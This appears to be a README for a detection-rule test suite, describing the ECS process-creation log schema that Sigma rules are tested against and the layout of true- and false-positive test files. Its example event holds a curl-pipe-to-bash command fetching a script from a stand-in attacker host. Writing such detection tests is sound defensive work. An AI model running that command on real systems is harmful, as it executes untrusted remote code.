# Sample log schema

The offline test suite evaluates rules against small JSON-lines (`.jsonl`)
files: one event per line. Events follow a **process-creation** shape mapped to
[Elastic Common Schema (ECS)](https://www.elastic.co/guide/en/ecs/current/index.html),
the schema Elastic Agent / Auditbeat emit for Linux. Because both the Sigma
rules and the sample logs speak ECS, conversion to Elastic is (for these rules)
a no-op and tests stay faithful to what production telemetry looks like.

## Required fields

Each event is a single JSON object. The fields the rules actually match on:

| ECS field                      | Meaning                                  |
|--------------------------------|------------------------------------------|
| `@timestamp`                   | ISO-8601 event time                      |
| `event.category`               | `process`                                |
| `event.type`                   | `start`                                  |
| `event.action`                 | e.g. `exec`                              |
| `host.name`                    | originating host                         |
| `user.name`                    | acting user                             |
| `process.executable`           | absolute path of the binary             |
| `process.name`                 | basename of the binary                  |
| `process.command_line`         | full command line (primary match field) |
| `process.parent.executable`    | parent binary path (optional)           |
| `process.parent.command_line`  | parent command line (optional)          |
| `file.path`                    | target file, for file-touching rules    |

Nested dotted keys may be written either nested (`{"process": {"command_line": ...}}`)
or flattened (`{"process.command_line": ...}`) — the engine accepts both.

## Example

True-positive event for the `curl ... | bash` rule:

```json
{"@timestamp":"2026-01-15T10:00:00.000Z","event":{"category":"process","type":"start","action":"exec"},"host":{"name":"web-01"},"user":{"name":"www-data"},"process":{"executable":"/bin/bash","name":"bash","command_line":"bash -c 'curl http://evil.example/x.sh | bash'"}}
```

## Conventions for TP/FP pairs

For every rule `tests/logs/<rule_id>/` holds:

* `true_positive.jsonl` — at least one event that **must** trigger the rule;
* `false_positive.jsonl` — benign events that **must not** trigger it.

`<rule_id>` is the Sigma `id` (a UUID). Keep the false-positive event as close
as possible to the true-positive one (same binary, benign arguments) so the test
proves the rule is *specific*, not just present.
